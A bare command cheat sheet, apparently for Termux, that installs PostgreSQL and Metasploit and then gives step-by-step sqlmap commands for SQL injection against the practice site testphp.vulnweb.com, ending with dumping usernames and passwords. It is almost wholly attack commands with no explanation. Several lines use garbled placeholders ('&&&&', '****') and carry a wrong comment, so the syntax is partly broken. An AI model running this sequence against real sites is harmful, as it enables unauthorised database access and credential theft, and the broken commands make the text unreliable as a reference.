


apt install postgresql

//install postgresql



mkdir -p $PREFIX/var/lib/postgresql
//install postgresql


initdb $PREFIX/var/lib/postgresql


pg_ctl -D $PREFIX/var/lib/postgresql start


createuser --superuser --pwprompt root


createdb mydb


psql mydb





exit

pkg install unstable-repo


pkg install metasploit




apt install sqlmap

sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs





// database open 



sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D (database)



//database name 



sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D &&&& -tables


//tables open


sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D **** -T (tables name) -columns



//columns open





sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D **** -T  **** -C &&&&


//columns name


sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D **** -T **** -C  (columns name) -dump


// (passwor) (user name) dump 
